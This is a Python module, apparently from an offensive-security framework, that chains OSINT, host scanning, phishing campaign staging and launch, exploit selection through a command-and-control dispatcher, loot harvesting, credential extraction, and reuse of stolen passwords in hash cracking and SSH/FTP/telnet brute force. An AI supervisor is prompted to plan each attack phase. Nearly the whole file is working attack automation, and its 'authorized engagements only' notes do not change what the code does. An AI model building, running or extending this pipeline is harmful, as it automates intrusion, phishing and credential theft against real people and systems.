"""quantum.overlord.lifecycle — autonomous 7-phase offensive lifecycle.

  osint -> recon -> phish -> exploit -> postex -> loot -> reuse

Every phase is owned by a repo agent (role-matched from the agents
registry, SLDR fallback), advised by the AI supervisor when a provider
key is configured (deterministic offline plan otherwise — --no-ai
safe), and journaled to the audit log (tag LIFECYCLE).

The chain is genuinely interconnected, not a slideshow:

  * recon consumes OSINT selectors (first_host chaining);
  * exploit consumes recon live-hosts via the real QCLI dispatch;
  * loot extraction parses real loot (DataHarvester) into credentials;
  * reuse feeds those loot credentials as the wordlist of a real
    crack_hashes / service-brute run, then closes with a MITRE report.

Authorized engagements only: the phishing phase *stages* the campaign
config and launches live lures only with explicit
``phish_launch: True`` in variables.
"""
from __future__ import annotations

import ipaddress
import os
import re
import time

from quantum.core.env import LOOT_DIR, LOG_DIR
from quantum.core.logging import _tail_jsonl, log

LIFE_CYCLE = [
    {"id": "osint",
     "name": "OSINT — target development",
     "agent_role": "intel",
     "tools": ["osint_lookup()", "shadowdragon_query_plan()",
               "intelx_search()", "darkowl_search()"],
     "description": "Passive-first selectors: domain RDAP/DoH, vendor "
                    "query plans, keyed IntelX/DarkOwl pivots."},
    {"id": "recon",
     "name": "Recon — live-host discovery",
     "agent_role": "intel",
     "tools": ["ReconModule.scan()", "ReconModule.fingerprint()"],
     "description": "CIDR port sweep or single-host fingerprint; "
                    "publishes first_host for downstream phases."},
    {"id": "phish",
     "name": "Social engineering / phishing",
     "agent_role": "deploy",
     "tools": ["generate_social_engineering_campaign()",
               "PhishEngine.launch() (gated)"],
     "description": "Stages the lure campaign; launches only with "
                    "explicit phish_launch authorization."},
    {"id": "exploit",
     "name": "Exploitation",
     "agent_role": "breach",
     "tools": ["zerocheck", "plan", "decide (QCLI dispatch)"],
     "description": "Vulnerability validation + weapon selection "
                    "through the real QCLI command surface."},
    {"id": "postex",
     "name": "Post-exploitation",
     "agent_role": "deploy",
     "tools": ["TASKQ", "DataHarvester.harvest_host()"],
     "description": "Implant task-queue state + per-host loot harvest."},
    {"id": "loot",
     "name": "Loot extraction",
     "agent_role": "scribe",
     "tools": ["DataHarvester.analyze_blob()"],
     "description": "Parses loot text into credentials (userpass hits) "
                    "for the reuse phase."},
    {"id": "reuse",
     "name": "Loot reuse + end of life cycle",
     "agent_role": "operator",
     "tools": ["crack_hashes()", "brute_*()", "mitre (QCLI dispatch)"],
     "description": "Loot credentials become the next attack's wordlist; "
                    "closes with a MITRE coverage report."},
]


def phase_agent(role):
    """Repo agent id owning a lifecycle role (role match, SLDR fallback)."""
    try:
        from quantum.ai.agents import load_all
        agents = load_all()
    except Exception:  # noqa: BLE001 — registry unreadable
        return "sldr"
    for aid, agent in agents.items():
        if isinstance(agent, dict) and agent.get("role") == role:
            return aid
    return "sldr"


def _advice(ai, phase_id, ctx):
    """AI advice for a phase, or None offline (never raises)."""
    if ai is None:
        return None
    try:
        return ai.query(
            f"Offensive lifecycle phase {phase_id} on scope "
            f"{ctx.get('scope')}. State: "
            f"{str(ctx.get('artifacts', {}))[:800]}. One paragraph: "
            f"next action and what success looks like. Authorized "
            f"engagement; be concrete.",
            system="You are an offensive-security planner. Authorized "
                   "engagement only.")
    except Exception:  # noqa: BLE001 — advice is optional
        return None


def _is_cidr(scope):
    try:
        ipaddress.ip_network(str(scope), strict=False)
        return "/" in str(scope)
    except ValueError:
        return False


# ------------------------------------------------------------------ phases
def phase_osint(ctx, dispatch=None, ai=None):
    """Passive-first selectors for the scope."""
    from quantum.recon.shadowdragon import shadowdragon_query_plan
    scope = ctx.get("scope", "")
    artifacts = {"plans": [], "lookups": {}, "keyed": {}}
    stype = "domain" if "." in scope and not _is_cidr(scope) else "cidr"
    artifacts["plans"].append(
        shadowdragon_query_plan("domain" if stype == "domain" else "ip",
                                scope))
    if stype == "domain":
        from quantum.recon.scan import ReconModule
        try:
            artifacts["lookups"]["osint"] = ReconModule().osint(scope)
        except Exception as exc:  # noqa: BLE001 — journaled
            artifacts["lookups"]["osint_error"] = str(exc)
    for vendor, key_envs, fn in (
            ("intelx", ("INTELX_API_KEY", "INTELX_KEY"), None),
            ("darkowl", ("DARKOWL_PUBLIC_KEY",), None)):
        if any(os.environ.get(k) for k in key_envs):
            artifacts["keyed"][vendor] = "key configured — query via " \
                f"/api/osint/{vendor}/search"
        else:
            artifacts["keyed"][vendor] = "skipped (no API key)"
    return {"status": "ok", "summary": f"osint: plan + "
            f"{len(artifacts['lookups'])} lookup(s)",
            "data": artifacts}


def phase_recon(ctx, dispatch=None, ai=None):
    """Live-host discovery; publishes first_host."""
    from quantum.recon.scan import ReconModule
    scope = ctx.get("scope", "")
    recon = ReconModule()
    if _is_cidr(scope):
        live = recon.scan(scope)
    else:
        try:
            live = {scope: {"ip": scope,
                            "fingerprint": recon.fingerprint(scope)}}
        except Exception as exc:  # noqa: BLE001
            return {"status": "error", "summary": f"recon: {exc}",
                    "data": {}}
    hosts = sorted(live)
    if hosts:
        ctx["first_host"] = hosts[0]
    return {"status": "ok" if hosts else "skip",
            "summary": f"recon: {len(hosts)} live host(s)",
            "data": {"live": live, "first_host": ctx.get("first_host")}}


def phase_phish(ctx, dispatch=None, ai=None):
    """Stage the lure campaign; launch only when authorized."""
    from quantum.social.messaging import \
        generate_social_engineering_campaign
    variables = ctx.get("variables", {})
    campaign = generate_social_engineering_campaign(
        variables.get("phish_platform", "sms"),
        variables.get("phish_technique", "phishing"),
        ctx.get("scope", ""),
        variables.get("phish_provider", "abliteratus"))
    data = {"campaign": campaign, "launched": False}
    if variables.get("phish_launch") is True:
        from quantum.camwar.brute_v3 import PhishEngine
        try:
            data["launch"] = PhishEngine().launch(
                {"target_email": variables.get("phish_target", ""),
                 "campaign": campaign})
            data["launched"] = True
        except Exception as exc:  # noqa: BLE001
            data["launch_error"] = str(exc)
    return {"status": "ok", "summary": "phish: staged" +
            (" + launched" if data["launched"] else " (launch gated)"),
            "data": data}


def phase_exploit(ctx, dispatch=None, ai=None):
    """Validate + select weapons through the QCLI surface."""
    host = ctx.get("first_host") or ctx.get("scope", "")
    results = {}
    if dispatch is not None:
        try:
            results["zerocheck"] = dispatch("zerocheck", {"ip": host})
        except Exception as exc:  # noqa: BLE001
            results["zerocheck_error"] = str(exc)
        try:
            results["plan"] = dispatch("plan", {"recon": {
                "first_host": host,
                "live": ctx.get("artifacts", {}).get("recon", {}).get(
                    "data", {}).get("live", {})}})
        except Exception as exc:  # noqa: BLE001
            results["plan_error"] = str(exc)
    else:
        results["note"] = "no dispatcher — validation skipped"
    ok = any(isinstance(v, dict) and "error" not in v
             for v in results.values())
    return {"status": "ok" if ok else "skip",
            "summary": f"exploit: zerocheck+plan on {host}",
            "data": results}


def phase_postex(ctx, dispatch=None, ai=None):
    """Task-queue state + per-host loot harvest."""
    from quantum.postexploit.harvest import DataHarvester
    from quantum.postexploit.killswitch import TASKQ
    harvester = DataHarvester()
    hosts = sorted(os.listdir(ctx.get("loot_dir", LOOT_DIR))) \
        if os.path.isdir(ctx.get("loot_dir", LOOT_DIR)) else []
    harvested = {}
    for host in hosts:
        try:
            harvested[host] = harvester.harvest_host(host)
        except Exception as exc:  # noqa: BLE001
            harvested[host] = {"error": str(exc)}
    return {"status": "ok",
            "summary": f"postex: {len(TASKQ)} queued task(s), "
                       f"{len(harvested)} host(s) harvested",
            "data": {"tasks": dict(TASKQ), "harvested": harvested}}


def _loot_text_files(loot_dir):
    out = []
    for host in sorted(os.listdir(loot_dir)):
        hdir = os.path.join(loot_dir, host)
        if not os.path.isdir(hdir):
            continue
        for fn in sorted(os.listdir(hdir)):
            if fn.endswith((".txt", ".log", ".csv")):
                fp = os.path.join(hdir, fn)
                try:
                    if os.path.getsize(fp) > 1_000_000:
                        continue
                    with open(fp, encoding="utf-8",
                              errors="replace") as fh:
                        out.append((host, fn, fh.read(200_000)))
                except OSError:
                    continue
    return out


def phase_loot(ctx, dispatch=None, ai=None):
    """Extract credentials from real loot into ctx['loot_creds']."""
    from quantum.postexploit.harvest import DataHarvester
    harvester = DataHarvester()
    creds = []
    stats = {"files": 0, "userpass": 0, "emails": 0}
    for host, fn, text in _loot_text_files(
            ctx.get("loot_dir", LOOT_DIR)):
        stats["files"] += 1
        try:
            hits = harvester.analyze_blob(text)
        except Exception:  # noqa: BLE001
            continue
        stats["userpass"] += len(hits.get("userpass", []))
        stats["emails"] += len(hits.get("emails", []))
        for entry in hits.get("userpass", []):
            m = re.search(r"Password:\s*(\S+)", entry)
            pw = m.group(1) if m else None
            if pw and pw not in creds:
                creds.append(pw)
    ctx["loot_creds"] = creds
    return {"status": "ok" if creds else "skip",
            "summary": f"loot: {stats['files']} file(s), "
                       f"{stats['userpass']} credential(s), "
                       f"{len(creds)} unique password(s)",
            "data": stats}


def phase_reuse(ctx, dispatch=None, ai=None):
    """Loot credentials attack the next target; MITRE closes the loop."""
    from quantum.brute.hashes import crack_hashes
    creds = ctx.get("loot_creds", [])
    variables = ctx.get("variables", {})
    data = {"cracked": {}, "service": {}, "report": {}}
    targets = variables.get("hash_targets", [])
    if targets and creds:
        try:
            data["cracked"] = crack_hashes(targets, creds, fmt=variables.get(
                "hash_fmt", "ntlm" if len(targets[0]) == 32 else "md5"))
        except Exception as exc:  # noqa: BLE001
            data["cracked"] = {"error": str(exc)}
    svc = variables.get("service_target")
    if svc and creds:
        from quantum.brute import services as _svc
        fn = {"ftp": _svc.brute_ftp, "ssh": _svc.brute_ssh,
              "telnet": _svc.brute_telnet}.get(svc.get("service", "ftp"))
        if fn is not None:
            try:
                data["service"] = fn(
                    svc.get("host", ""), svc.get("port", 21),
                    svc.get("users"), creds,
                    variables.get("service_timeout", 5))
            except Exception as exc:  # noqa: BLE001
                data["service"] = {"error": str(exc)}
    if dispatch is not None:
        try:
            data["report"] = dispatch("mitre", {})
        except Exception as exc:  # noqa: BLE001
            data["report"] = {"error": str(exc)}
    hits = len(data.get("cracked", {}).get("hits", [])) + \
        len(data.get("service", {}).get("hits", []))
    return {"status": "ok",
            "summary": f"reuse: {len(creds)} loot password(s) tried, "
                       f"{hits} hit(s)",
            "data": data}


_RUNNERS = {"osint": phase_osint, "recon": phase_recon,
            "phish": phase_phish, "exploit": phase_exploit,
            "postex": phase_postex, "loot": phase_loot,
            "reuse": phase_reuse}


def run_lifecycle(scope, variables=None, dispatch=None, ai=None,
                  runners=None, loot_dir=None, on_phase=None):
    """Execute the chained 7-phase life cycle (real tools, journaled).

    dispatch: callable(cmd, params) -> dict (defaults to the real
    QCLI_API handle — the same surface /ai uses). ai: AI_Supervisor or
    None (None = deterministic offline plan). runners: {phase_id: fn}
    overrides (tests inject hermetic doubles; production uses the
    real phase_* runners above).
    """
    variables = variables or {}
    if dispatch is None:
        from quantum.c2.app import QCLI_API
        dispatch = QCLI_API().handle
    runners = runners or {}
    ctx = {"scope": scope, "variables": variables, "loot_creds": [],
           "loot_dir": loot_dir or LOOT_DIR, "artifacts": {}}
    journal = []
    start = time.time()
    for phase in LIFE_CYCLE:
        pid = phase["id"]
        agent = phase_agent(phase["agent_role"])
        fn = runners.get(pid) or _RUNNERS[pid]
        advice = _advice(ai, pid, ctx)
        try:
            result = fn(ctx, dispatch, ai)
        except Exception as exc:  # noqa: BLE001 — journal, continue
            result = {"status": "error", "summary": str(exc), "data": {}}
        ctx["artifacts"][pid] = {"summary": result.get("summary"),
                                 "status": result.get("status")}
        entry = {"phase": pid, "name": phase["name"], "agent": agent,
                 "status": result.get("status"), "advice": advice,
                 "result": result}
        journal.append(entry)
        log(f"LIFECYCLE {pid} [{agent}] {result.get('status')}: "
            f"{result.get('summary')}", "LIFECYCLE")
        if on_phase is not None:
            try:
                on_phase(entry)
            except Exception:  # noqa: BLE001 — callback optional
                pass
    elapsed = round(time.time() - start, 3)
    log(f"LIFECYCLE complete scope={scope} "
        f"creds={len(ctx['loot_creds'])} elapsed={elapsed}s", "LIFECYCLE")
    return {"scope": scope, "elapsed_s": elapsed,
            "loot_creds": ctx["loot_creds"],
            "first_host": ctx.get("first_host"),
            "journal": journal}


def lifecycle_recent_runs(limit=20):
    """Recent lifecycle runs from the audit log (real)."""
    out = []
    for rec in _tail_jsonl(os.path.join(LOG_DIR, "audit.jsonl"), 400):
        try:
            msg = str(rec.get("msg", ""))
        except AttributeError:
            continue
        if "LIFECYCLE" in msg:
            out.append(rec)
            if len(out) >= limit:
                break
    return out


def loot_stats(loot_dir=None):
    """Live loot inventory: hosts, parsed creds, password count."""
    loot_dir = loot_dir or LOOT_DIR
    hosts, creds = 0, 0
    try:
        names = sorted(os.listdir(loot_dir))
    except OSError:
        return {"hosts": 0, "parsed_creds": 0}
    for host in names:
        hdir = os.path.join(loot_dir, host)
        if not os.path.isdir(hdir):
            continue
        hosts += 1
        parsed = os.path.join(hdir, "parsed.txt")
        if os.path.isfile(parsed):
            try:
                with open(parsed, encoding="utf-8",
                          errors="replace") as fh:
                    creds += sum(1 for ln in fh if ":" in ln)
            except OSError:
                continue
    return {"hosts": hosts, "parsed_creds": creds}


def lifecycle_dashboard_state():
    """Webcard state for the lifecycle dashboard."""
    roles = {}
    for phase in LIFE_CYCLE:
        role = phase["agent_role"]
        roles.setdefault(role, {"agent": phase_agent(role),
                                "phases": []})["phases"].append(phase["id"])
    return {
        "phases": LIFE_CYCLE,
        "agents": roles,
        "loot": loot_stats(),
        "recent": lifecycle_recent_runs(10),
        "chain": " -> ".join(p["id"] for p in LIFE_CYCLE),
        "note": "Agent-driven, chained and interconnected: recon eats "
                "OSINT, exploit eats recon, loot creds feed reuse. "
                "Phishing launches only when explicitly authorized.",
    }
